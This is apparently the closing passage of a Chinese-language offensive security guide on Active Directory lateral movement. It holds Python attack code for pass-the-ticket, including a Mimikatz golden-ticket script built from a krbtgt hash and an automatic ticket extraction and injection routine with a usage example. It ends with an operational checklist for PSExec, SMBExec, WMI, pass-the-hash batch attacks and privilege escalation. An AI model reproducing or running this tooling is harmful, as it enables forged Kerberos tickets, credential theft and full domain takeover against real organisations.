                print(f"[+] SMB access successful to {target_ip}")
                return True
            else:
                print(f"[!] SMB access failed to {target_ip}")
                return False
                
        except FileNotFoundError:
            print("[!] smbclient not found")
            return False
    
    def create_golden_ticket(self, domain, sid, krbtgt_hash, username="Administrator"):
        """创建黄金票据"""
        try:
            # 使用Mimikatz创建黄金票据
            mimikatz_script = f"""
            privilege::debug
            kerberos::golden /domain:{domain} /sid:{sid} /krbtgt:{krbtgt_hash} /user:{username}
            exit
            """
            
            script_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False)
            script_file.write(mimikatz_script)
            script_file.close()
            
            # 执行Mimikatz
            # result = subprocess.run(['mimikatz.exe', '/script', script_file.name], 
            #                        capture_output=True, text=True)
            
            # 清理
            os.unlink(script_file.name)
            
            print(f"[+] Golden ticket created for {username}@{domain}")
            return True
            
        except Exception as e:
            print(f"[!] Error creating golden ticket: {e}")
            return False
    
    def auto_ticket_exploitation(self):
        """自动票据利用"""
        print("[*] Starting automatic ticket exploitation...")
        
        # 1. 从内存提取票据
        kirbi_files = self.extract_ticket_from_memory()
        
        for kirbi_file in kirbi_files:
            self.load_ticket_from_file(kirbi_file)
        
        # 2. 注入所有票据
        for ticket in self.tickets:
            if 'file_path' in ticket:
                self.inject_ticket(ticket['file_path'])
        
        # 3. 验证票据注入
        self.verify_ticket_injection()
        
        print("[+] Automatic ticket exploitation completed")
        return True

# 使用示例
ptt = PassTheTicket()

# 自动票据利用
ptt.auto_ticket_exploitation()

# 验证票据
ptt.verify_ticket_injection()
```

---

## 实战检查清单

### 协议利用
- [ ] SMB连接已建立
- [ ] PSExec技术已配置
- [ ] SMBExec已实施
- [ ] WMI连接已建立
- [ ] DCOM对象已测试

### 横向移动
- [ ] 哈希传递已配置
- [ ] 票据传递已设置
- [ ] 批量PTH攻击已执行
- [ ] 横向移动路径已规划
- [ ] 权限提升已实施